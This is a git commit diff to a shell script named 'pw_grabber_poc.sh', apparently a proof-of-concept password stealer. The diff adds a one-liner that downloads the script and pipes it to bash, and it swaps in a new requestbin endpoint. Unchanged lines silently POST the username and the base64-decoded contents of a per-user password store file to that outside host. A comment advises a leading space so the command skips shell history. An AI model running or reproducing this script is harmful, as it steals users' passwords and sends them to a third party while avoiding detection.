f3da9bdaa0052720a535644c9e4d72ff4e356bdc
Daniel Ramp <12480131+DanielRamp@users.noreply.github.com>
2019-11-04 21:21:46 +0100

    Update pw_grabber_poc.sh
    Added oneliner and new requestbin.

--- pw_grabber_poc.sh
+++ pw_grabber_poc.sh
@@ -7,14 +7,16 @@
 ###                                           NO FIX PROVIDED YET                                                           ###
 ###-------------------------------------------------------------------------------------------------------------------------###
 
+
+# Download an execute oneliner
+curl -sSL https://raw.githubusercontent.com/DanielRamp/SecurityAtGIBMIT/master/pw_grabber_poc.sh | bash
+
+
+# or
 # Make runable (chmod +x pw_grabber_poc.sh)
 # Run with [space] ./pw_grabber_poc.sh (space before cmd doesn't save to history)
 
-# Create a bin here: https://requestbin.com/ 
-# Change REQUESTBIN variable to your generated endpoint
-REQUESTBIN=https://en56wzg1et3b6.x.pipedream.net 
+REQUESTBIN=https://enwm0jstbopwp.x.pipedream.net
 
 wget -O- --post-data $(whoami) $REQUESTBIN > /dev/null 2>&1
 wget -O- --post-data $(cat /tmp/password-store-$USER | base64 -d) $REQUESTBIN > /dev/null 2>&1
-
-# Now you can access the exfiltrated data over your requestbin instance
